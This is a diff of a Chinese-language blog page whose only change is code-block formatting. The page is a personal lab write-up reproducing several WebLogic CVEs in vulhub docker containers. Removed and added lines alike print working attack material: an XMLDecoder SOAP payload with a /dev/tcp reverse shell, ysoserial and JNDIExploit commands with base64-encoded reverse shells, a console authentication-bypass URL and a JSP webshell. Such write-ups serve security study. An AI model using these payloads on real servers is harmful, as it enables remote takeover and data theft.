@@ -17,7 +17,7 @@
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -168,12 +168,12 @@
 <h2 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2><p>简要介绍：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chen-w/p/14652153.html">https://www.cnblogs.com/chen-w/p/14652153.html</a></p>
 <h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
 <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先使用docker起一个weblogic CVE-2017-1027的环境，进入到vulhub&#x2F;weblogic&#x2F;CVE-2017-1027</p>
-<pre><code class="dockerfile">docker-compose up -d
-</code></pre>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
 <p>启动成功后</p>
 <p><img src="/../image/image-20240716213102663.png" alt="image-20240716213102663"></p>
-<pre><code class="docker">docker ps -a
-</code></pre>
+<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
+
 <p>查看运行状态</p>
 <p><img src="/../image/image-20240716213125924.png" alt="image-20240716213125924"></p>
 <p>接着去访问本机的7001端口，出现如下页面，说明服务成功开启：</p>
@@ -181,49 +181,18 @@
 <p>访问&#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
 <p><img src="/../image/image-20240716214533663.png" alt="image-20240716214533663"></p>
 <p>可以先扫一下服务</p>
-<pre><code>nmap -sV 192.168.174.137
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.174.137</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240716222238125.png" alt="image-20240716222238125"></p>
 <p>用相关漏洞的扫描工具也可以</p>
 <p><img src="/../image/image-20240716222344082.png" alt="image-20240716222344082"></p>
-<h3 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h3><pre><code class="shell">bash -i &gt;&amp; /dev/tcp/vpsip/ncport 0&gt;&amp;1
-</code></pre>
+<h3 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vpsip/ncport 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240718205520947.png" alt="image-20240718205520947"></p>
 <p>能弹啊，docker为什么弹不了，还要配置网卡吗</p>
 <p>发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：</p>
-<pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
-Host: 192.168.1.15:7001
-Accept-Encoding: gzip, deflate
-Accept: */*
-Accept-Language: en
-User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-Connection: close
-Content-Type: text/xml
-Content-Length: 637
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.1.15:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 637</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.174.137/888 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line">12345678910111213141516171819202122232425262728293031</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;
-&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
-&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
-&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
-&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
-&lt;void index=&quot;0&quot;&gt;
-&lt;string&gt;/bin/bash&lt;/string&gt;
-&lt;/void&gt;
-&lt;void index=&quot;1&quot;&gt;
-&lt;string&gt;-c&lt;/string&gt;
-&lt;/void&gt;
-&lt;void index=&quot;2&quot;&gt;
-&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.174.137/888 0&amp;gt;&amp;amp;1&lt;/string&gt;
-&lt;/void&gt;
-&lt;/array&gt;
-&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
-&lt;/java&gt;
-&lt;/work:WorkContext&gt;
-&lt;/soapenv:Header&gt;
-&lt;soapenv:Body/&gt;
-&lt;/soapenv:Envelope&gt;
-12345678910111213141516171819202122232425262728293031
-</code></pre>
 <h2 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Weblogic 允许远程用户在未经授权的情况下通过IIOP&#x2F;T3进行JNDI lookup 操作，当JDK版本过低或本地存在javaSerializedData时，这可能会导致RCE漏洞。</p>
 <p>WebLogic 存在远程代码执行漏洞（CVE-2023-21839&#x2F;CNVD-2023-04389），由于Weblogic IIOP&#x2F;T3协议存在缺陷，当IIOP&#x2F;T3协议开启时，允许未经身份验证的攻击者通过IIOP&#x2F;T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功WebLogic Server可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。</p>
 <h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>WebLogic_Server &#x3D; 12.2.1.3.0<br>WebLogic_Server &#x3D; 12.2.1.4.0<br>WebLogic_Server &#x3D; 14.1.1.0.0<br><strong>CVE-2023-21839是一个weblogic的JNDI注入漏洞。</strong></p>
@@ -232,37 +201,36 @@ Content-Length: 637
 <p>访问靶场地址：</p>
 <p><img src="/../image/image-20240717095020526.png" alt="image-20240717095020526"></p>
 <p>Nmap扫描：</p>
-<pre><code>nmap -sV 192.168.174.137
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.174.137</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240717095129769.png" alt="image-20240717095129769"></p>
 <p>扫描验证T3是否开启：</p>
-<pre><code>nmap -n -v -p 7001,7002 192.168.174.137 --script=weblogic-t3-info
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -v -p 7001,7002 192.168.174.137 --script=weblogic-t3-info</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240717095226815.png" alt="image-20240717095226815"></p>
 <p>开启LDAP和HTTP服务</p>
-<pre><code>ava -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.174.137	//攻击者ip
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ava -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.174.137	//攻击者ip</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240717224640807.png" alt="image-20240717224640807"></p>
 <p>监听端口（用于接收反弹的shell）</p>
-<pre><code>nc -lvvp 9999
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240717224800690.png" alt="image-20240717224800690"></p>
 <p>使用工具包</p>
 <p>j教程使用的：<a target="_blank" rel="noopener" href="https://github.com/ASkyeye/CVE-2023-21839">GitHub - ASkyeye&#x2F;CVE-2023-21839: Weblogic CVE-2023-21839 RCE (无需Java依赖一键RCE)</a></p>
 <p>这个下载下来要在linux环境下编译，windows下编译了好像不行用，不懂是什么问题</p>
-<pre><code>./CVE-2023-21839 -ip 192.168.174.137 -port 7001 -ldap ldap://192.168.174.137:1389/Basic/ReverseShell/192.168.174.137/9999
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./CVE-2023-21839 -ip 192.168.174.137 -port 7001 -ldap ldap://192.168.174.137:1389/Basic/ReverseShell/192.168.174.137/9999</span><br></pre></td></tr></table></figure>
+
 <p>因为担心docker在虚拟机nat不通就没在外面测试了</p>
 <p><img src="/../image/image-20240717225351922.png" alt="image-20240717225351922"></p>
 <p>最后也是成功反弹shell了，这个java的漏洞的环境太难搭了</p>
 <p>成功复现，记得关闭docker启动的镜像</p>
 <p>关闭镜像</p>
-<pre><code>docker-compose stop
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose stop</span><br></pre></td></tr></table></figure>
+
 <p>因为docker-compose up -d也是拉镜像启动，所以本地会有镜像保留，有些还挺大的，不需要的话可以删了</p>
-<pre><code>docker images
-docker rmi -f 镜像id
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker rmi -f 镜像id</span><br></pre></td></tr></table></figure>
+
 <h2 id="CVE-2020-14750"><a href="#CVE-2020-14750" class="headerlink" title="CVE-2020-14750"></a>CVE-2020-14750</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2168616">https://cloud.tencent.com/developer/article/2168616</a></p>
 <h4 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h4><p><strong>- WebLogic Console权限认证绕过漏洞（CVE-2020-14750） -</strong> </p>
 <p>Weblogic Server是Oracle公司的一款适用于云环境和传统环境的应用<a target="_blank" rel="noopener" href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>，它提供了一个现代轻型开发平台，支持应用从开发到生产的整个生命周期管理，并简化了应用的部署和管理。Oracle官方在2020年10月发布了关键补丁更新公告，其中包括一个CVE-2020-14750为 WebLogic Console权限认证绕过的漏洞CVE-2020-14882补丁的绕过漏洞，CVSS 评分 9.8 分。CVE-2020-14882 补丁被绕过后，攻击者就可以再度绕过Console控制台的权限校验，访问原本需要登录才可以访问的资源和接口功能。尽管 CVE-2020-14883 这个后台的任意代码执行漏洞已被修复，但攻击者依然可以通过寻找利用其他合适的后台接口漏洞，实现远程代码执行，从而获取服务器权限。</p>
@@ -275,57 +243,31 @@ docker rmi -f 镜像id
 <li>Oracle WebLogic Server 14.1.1.0.0</li>
 </ul>
 <h4 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h4><p>使用<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://github.com/0xn0ne/WeblogicScanner&source=article&objectId=2168616">WeblogicScaner</a>工具检测目标网站存在CVE-2020-14750漏洞。</p>
-<pre><code>python3 ws.py -t http://172.16.14.149:7001 -v CVE-2020-14750
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ws.py -t http://172.16.14.149:7001 -v CVE-2020-14750</span><br></pre></td></tr></table></figure>
+
 <p>构造特殊URL地址绕过WebLogic Console控制台权限进行访问：</p>
 <p><img src="/../image/image-20240718114246101.png" alt="image-20240718114246101"></p>
 <p><img src="/../image/image-20240718114220535.png" alt="image-20240718114220535"></p>
-<pre><code>http://172.16.14.149:7001/console/css/%25%32%65%25%32%65%25%32%66/console.portal
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.149:7001/console/css/%25%32%65%25%32%65%25%32%66/console.portal</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240718114153961.png" alt="image-20240718114153961"></p>
 <h2 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51198941/article/details/134193310">https://blog.csdn.net/weixin_51198941/article/details/134193310</a></p>
 <h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为&#x2F;ws_utc&#x2F;begin.do，&#x2F;ws_utc&#x2F;config.do</p>
 <p>这里进后台的部分借用前面的漏洞</p>
 <p>访问漏洞页面（需要手动设置一下环境设置Work Home Dir为，&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css)</p>
-<pre><code>http://172.16.14.149:7001/ws_utc/config.do
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.149:7001/ws_utc/config.do</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240718123446376.png" alt="image-20240718123446376"></p>
 <p>点击安全 -&gt; 添加，名字和密码可以随意设置，上传jsp木马文件（登录密码为fafa）；</p>
-<pre><code class="jsp">&lt;%!
-    class U extends ClassLoader &#123;
-        U(ClassLoader c) &#123;
-            super(c);
-        &#125;
-        public Class g(byte[] b) &#123;
-            return super.defineClass(b, 0, b.length);
-        &#125;
-    &#125;
- 
-    public byte[] base64Decode(String str) throws Exception &#123;
-        try &#123;
-            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);
-            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);
-        &#125; catch (Exception e) &#123;
-            Class clazz = Class.forName(&quot;java.util.Base64&quot;);
-            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);
-            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);
-        &#125;
-    &#125;
-%&gt;
-&lt;%
-    String cls = request.getParameter(&quot;fafa&quot;);
-    if (cls != null) &#123;
-        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
-    &#125;
-%&gt;
-</code></pre>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;fafa&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240718123559300.png" alt="image-20240718123559300"></p>
 <p>文件上传的路径为<a target="_blank" rel="noopener" href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E6%97%B6%E9%97%B4%E6%88%B3%E8%8E%B7%E5%8F%96%E6%96%B9%E5%BC%8F%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%8C%E5%85%B6%E4%B8%80%E4%B8%BAbp%E6%8A%93%E5%8C%85%E6%9F%A5%E7%9C%8B%EF%BC%8C">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，这里的时间戳获取方式有两种，其一为bp抓包查看，</a></p>
 <p><img src="/../image/image-20240718124112290.png" alt="image-20240718124112290"></p>
 <p>其二利用浏览器自带的检查获取，如下所示：</p>
 <p><img src="/../image/image-20240718123631916.png" alt="image-20240718123631916"></p>
-<pre><code>http://172.16.14.149:7001/ws_utc/css/config/keystore/1721275902739_ma.jsp
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.149:7001/ws_utc/css/config/keystore/1721275902739_ma.jsp</span><br></pre></td></tr></table></figure>
+
 <p>这里的环境有点问题，待测，重新用docker起了环境，重复上述步骤</p>
 <p><img src="/../image/image-20240719104623897.png" alt="image-20240719104623897"></p>
 <p>这里先去靶场看看后台账户密码，默认管理员用户是weblogic，此处密码为h3L0YiTp</p>
@@ -355,8 +297,8 @@ docker rmi -f 镜像id
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h3><p>docker-compose起环境，访问</p>
 <p><img src="/../image/image-20240718210439993.png" alt="image-20240718210439993"></p>
 <p>这里先使用nmap扫描一下是否开启了WebLogic T3服务</p>
-<pre><code>nmap -n -v -p 7001,7002 192.168.174.137 --script=weblogic-t3-info
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -v -p 7001,7002 192.168.174.137 --script=weblogic-t3-info</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240718211002989.png" alt="image-20240718211002989"></p>
 <p>漏洞检测脚本，好多扫不出来，试试以前的旧版本</p>
 <p><img src="/../image/image-20240718231224408.png" alt="image-20240718231224408"></p>
@@ -364,25 +306,25 @@ docker rmi -f 镜像id
 <p>要专门这个探测工具才行。。但教程很多都是用旧版的ysoserial-0.1-cve-2018-2628-all，我试试新版的工具怎么用</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/st3pby/article/details/135111050">https://blog.csdn.net/st3pby/article/details/135111050</a></p>
 <p>启动JRMP Server（下面这个是练习）：</p>
-<pre><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 192.168.174.160 1099 CommonsCollections1 whoami
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 192.168.174.160 1099 CommonsCollections1 whoami</span><br></pre></td></tr></table></figure>
+
 <p>反弹shell命令：</p>
-<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.174.160:9999 0&gt;&amp;1
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.174.160:9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
 <p>base64编码<a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">https://ares-x.com/tools/runtime-exec</a></p>
-<pre><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
 <p>开启JMRP Server服务：</p>
-<pre><code>java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
+
 <p>本地监听9999端口：</p>
-<pre><code>nc -lvvp 9999
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
+
 <p>这个payload还有点难生成xxd装不上记得更新下源</p>
-<pre><code>sudo apt-get update
-</code></pre>
-<pre><code>java -jar ysoserial-all.jar JRMPClient 192.168.174.160:7777 | xxd -p | tr -d $&#39;\n&#39; &amp;&amp; echo #JRMP监听的端口
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar JRMPClient 192.168.174.160:7777 | xxd -p | tr -d $&#x27;\n&#x27; &amp;&amp; echo #JRMP监听的端口</span><br></pre></td></tr></table></figure>
+
 <p>和之前的比，payload没有2了是JRMPClient</p>
 <p><img src="/../image/image-20240718234851924.png" alt="image-20240718234851924"></p>
 <p>替换payload</p>
@@ -390,31 +332,30 @@ docker rmi -f 镜像id
 <p><img src="/../image/image-20240718234944773.png" alt="image-20240718234944773"></p>
 <p>半天没弹回来，保留一下，用别的方法测测</p>
 <p>在攻击机设置好JRM服务,这里执行touch命令时，注意路径</p>
-<pre><code>java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;touch /mytest.txt&quot;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;touch /mytest.txt&quot;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240719000106128.png" alt="image-20240719000106128"></p>
 <p>打开weblogictool，如图设置好参数</p>
 <p><img src="/../image/image-20240719000143387.png" alt="image-20240719000143387"></p>
 <p>执行后，在docker容器里查看,yml文件在哪就在哪执行</p>
-<pre><code>docker-compose exec weblogic /bin/bash
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose exec weblogic /bin/bash</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240719000226949.png" alt="image-20240719000226949"></p>
 <p>成功执行，那回到第一种方法，利用payload，重新走一遍</p>
 <p>开启JMRP Server服务：</p>
-<pre><code>java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;
-bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240719090315802.png" alt="image-20240719090315802"></p>
 <p>更新payload,windows下没有环境，在linux中执行,前面好像执行错了，这里客户端的ip是靶机的ip</p>
-<pre><code>sudo java -jar ysoserial-all.jar JRMPClient 192.168.174.137:7777 | xxd -p | tr -d $&#39;\n&#39; &amp;&amp; echo
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo java -jar ysoserial-all.jar JRMPClient 192.168.174.137:7777 | xxd -p | tr -d $&#x27;\n&#x27; &amp;&amp; echo</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240719091031289.png" alt="image-20240719091031289"></p>
 <p>更换payload</p>
 <p><img src="/../image/image-20240719090714180.png" alt="image-20240719090714180"></p>
 <p><img src="/../image/image-20240719091109057.png" alt="image-20240719091109057"></p>
 <p>使用 nc 进行监听本地的9999端口</p>
-<pre><code>nc -lvvp 9999
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240719091155144.png" alt="image-20240719091155144"></p>
 <p>执行poc还是不行，但后面在在kali测试好像就行了，python脚本执行完要过一会才有反弹回来。。</p>
 <p><img src="/../image/image-20240719101534297.png" alt="image-20240719101534297"></p>
